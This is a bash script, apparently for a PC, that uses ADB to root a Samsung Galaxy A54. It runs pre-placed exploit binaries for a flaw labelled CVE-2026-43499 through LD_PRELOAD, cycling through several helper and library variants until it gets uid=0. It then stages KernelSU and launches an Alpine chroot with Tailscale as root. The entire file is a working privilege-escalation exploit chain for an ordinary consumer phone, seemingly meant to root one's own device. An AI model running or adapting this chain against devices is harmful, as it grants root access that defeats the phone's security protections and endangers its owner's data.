#!/usr/bin/env bash
# ==============================================================================
# Samsung Galaxy A54 (A546E) - Automated Root & Chroot Launcher (PC / ADB)
# ==============================================================================

set -u

echo "[*] Waiting for ADB device..."
adb wait-for-device

echo "[*] Stage 1: Setting file permissions..."
adb shell "chmod +x /data/local/tmp/cve-2026-43499-root /data/local/tmp/libcve43499root.so /data/local/tmp/ksud-s25u-kdp 2>/dev/null || true"

try_exploit() {
    local helper="$1"
    local so_name="$2"
    echo "[*] Trying exploit: $helper + $so_name"
    adb shell "CVE43499_ROOT_HELPER=/data/local/tmp/$helper LD_PRELOAD=/data/local/tmp/$so_name /system/bin/true" >/dev/null 2>&1
    sleep 2
}

# 1. Standard cve-2026-43499-root + cve-2026-43499.so
try_exploit "cve-2026-43499-root" "cve-2026-43499.so"

# 2. cve-2026-43499-root + cve-2026-43499-app.so
if ! adb shell "su -c id" 2>/dev/null | grep -q "uid=0"; then
    echo "[!] Second variant being attempted (-app.so)..."
    try_exploit "cve-2026-43499-root" "cve-2026-43499-app.so"
fi

# 3. Fallback libcve43499root.so + cve-2026-43499.so
if ! adb shell "su -c id" 2>/dev/null | grep -q "uid=0"; then
    echo "[!] Third variant being attempted (libcve43499root.so)..."
    try_exploit "libcve43499root.so" "cve-2026-43499.so"
fi

# 4. Fallback libcve43499root.so + cve-2026-43499-app.so
if ! adb shell "su -c id" 2>/dev/null | grep -q "uid=0"; then
    echo "[!] Fourth variant being attempted (libcve43499root.so + -app.so)..."
    try_exploit "libcve43499root.so" "cve-2026-43499-app.so"
fi

echo "[*] Stage 2: Staging KernelSU (ksud)..."
adb shell '
if [ -f /data/local/tmp/ksud-next-a54x-A546EXXSKFZF4-kdp ]; then
    cp /data/local/tmp/ksud-next-a54x-A546EXXSKFZF4-kdp /data/local/tmp/.ksud-stage
    cp /data/local/tmp/ksud-next-a54x-A546EXXSKFZF4-kdp /data/local/tmp/ksud-s25u-kdp 2>/dev/null || true
elif [ -f /data/local/tmp/ksud-s25u-kdp ]; then
    cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage
fi
chmod 755 /data/local/tmp/.ksud-stage /data/local/tmp/ksud-s25u-kdp /data/local/tmp/ksud-next-a54x-A546EXXSKFZF4-kdp 2>/dev/null || true
'

echo "[*] Stage 3: Triggering late-load..."
adb shell "if [ -x /data/local/tmp/cve-2026-43499-root ]; then /data/local/tmp/cve-2026-43499-root --late-load; else /data/local/tmp/libcve43499root.so --late-load; fi"
sleep 2

# Root verification
echo "[*] Verifying root status..."
if adb shell "su -c id" 2>/dev/null | grep -q "uid=0"; then
    echo "[+] ROOT ELEVATION SUCCESSFUL! (KernelSU active)"
    
    echo "[*] Stage 4: Starting Alpine Chroot and Tailscale..."
    adb shell "su -c 'if [ -f /data/local/tmp/start-chroot.sh ]; then sh /data/local/tmp/start-chroot.sh daemon; elif [ -f /data/local/chroot/start-chroot.sh ]; then sh /data/local/chroot/start-chroot.sh daemon; fi'"
    
    echo "[+] Device connected to Tailscale network and ready!"
else
    echo "[-] Root acquisition failed. A device reboot may be required (KASLR slide mismatch)."
    exit 1
fi
